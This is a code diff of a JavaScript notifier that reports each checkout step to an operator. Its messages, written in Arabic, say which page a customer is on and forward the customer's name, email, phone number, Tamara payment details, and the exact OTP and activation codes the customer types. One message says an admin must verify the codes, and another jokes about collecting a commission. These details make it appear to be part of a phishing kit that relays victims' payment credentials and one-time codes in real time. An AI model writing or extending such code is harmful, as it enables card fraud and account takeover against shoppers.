@@ -70,19 +70,38 @@ const sendCheckoutEventNotification = async event => {
 
   const formatPrice = price =>
     new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(price) + ' ر.س';
-  const eventLabels = {
-    product_selected: '🛍️ اختيار المنتج',
-    checkout_started: '🛒 بدء الدفع',
-    payment_method_selected: '💳 اختيار طريقة الدفع',
-    phone_entered: '📱 إدخال رقم الهاتف',
-    phone_confirmed: '✅ تأكيد رقم الهاتف',
-    redirect_to_payment: '🔗 التحويل لبوابة الدفع',
-    checkout_completed: '🎉 إتمام الطلب',
+  const eventData = {
+    product_selected: {
+      title: '🛍️ العميل يضغط "اشترِ الآن" على بطاقة المنتج',
+      page: 'صفحة المنتج',
+    },
+    checkout_started: {
+      title: '🛒 العميل يدخل صفحة الشراء',
+      page: 'صفحة Checkout',
+    },
+    payment_method_selected: {
+      title: '💳 العميل ادخل رقم الهاتف',
+      page: 'صفحة اختيار طريقة الدفع',
+    },
+    phone_confirmed: {
+      title: '✅ أكدي رقم حتى تكمل',
+      page: 'صفحة انتظار الموافقة',
+    },
+    redirect_to_payment: {
+      title: '🔗 التحويل لمرحله الدفع النهائيه',
+      page: 'العميل جاهز للدفع',
+    },
+    checkout_completed: {
+      title: '🎉 اتمام الطلب مبروك عليكي اعطينا العموله 😁',
+      page: 'صفحة النجاح',
+    },
   };
 
-  const label = eventLabels[eventType] || eventType;
+  const eventInfo = eventData[eventType] || { title: eventType, page: '—' };
 
-  let text = `${label}\n`;
+  let text = `${eventInfo.title}\n`;
+  text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += `📍 العميل الآن في: ${eventInfo.page}\n\n`;
   text += `🆔 Session: ${sessionId.substring(0, 8)}...\n\n`;
 
   if (userName || userEmail) {
@@ -166,8 +185,9 @@ const sendCardApprovalRequest = async event => {
   const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
   const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';
 
-  let text = '💳 طلب موافقة — بيانات البطاقة\n';
+  let text = '💳 العميل في صفحه بيدخل بيانات البطاقه\n';
   text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += '📍 العميل الآن في: صفحة إدخال بيانات البطاقة\n\n';
 
   text += `👤 الاسم: ${userName || '—'}\n`;
   text += `📧 الإيميل: ${userEmail || '—'}\n`;
@@ -225,8 +245,9 @@ const sendCodeVerificationRequest = async (event, verificationCode) => {
   const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
   const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';
 
-  let text = '🔐 تحقق من كود التفعيل\n';
+  let text = '🔐 المشرف لازم يتحقق من كود التفعيل\n';
   text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += '📍 العميل الآن في: صفحة انتظار نتيجة التحقق\n\n';
 
   text += `👤 الاسم: ${userName || '—'}\n`;
   text += `📧 الإيميل: ${userEmail || '—'}\n`;
@@ -269,8 +290,9 @@ const sendActivationCode = async (event, activationCode) => {
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
 
-  let text = '🔐 كود التفعيل - تمارا\n';
+  let text = '🔐 العميل بصفحه كود التفعيل للهاتف\n';
   text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += '📍 العميل الآن في: صفحة إدخال رقم الهاتف\n\n';
 
   text += `👤 العميل: ${userName || '—'}\n`;
   text += `📱 الرقم: ${phoneNumber || '—'}\n`;
@@ -315,8 +337,9 @@ const sendOtpEnteredNotification = async (sessionId, phoneNumber, code) => {
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
 
-  let text = '🔐 العميل أدخل كود OTP\n';
+  let text = '🔐 العميل في صفحه ادخال كود التحقق النهائي\n';
   text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += '📍 العميل الآن في: صفحة إدخال كود التحقق\n\n';
   text += `📱 رقم الهاتف: ${phoneNumber || '—'}\n`;
   text += `🔑 الكود المدخل: <code>${code || '—'}</code>\n\n`;
   text += `🆔 Session: ${sessionShort}...\n`;
@@ -335,8 +358,9 @@ const sendActivationCodeEnteredNotification = async (sessionId, phoneNumber, cod
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
 
-  let text = '🔐 العميل أدخل كود التفعيل\n';
+  let text = '🔐 العميل ادخل كود التفعيل\n';
   text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += '📍 العميل الآن في: صفحة إدخال كود التفعيل\n\n';
   text += `📱 رقم الهاتف: ${phoneNumber || '—'}\n`;
   text += `🔑 الكود المدخل: <code>${code || '—'}</code>\n\n`;
   text += `🆔 Session: ${sessionShort}...\n`;
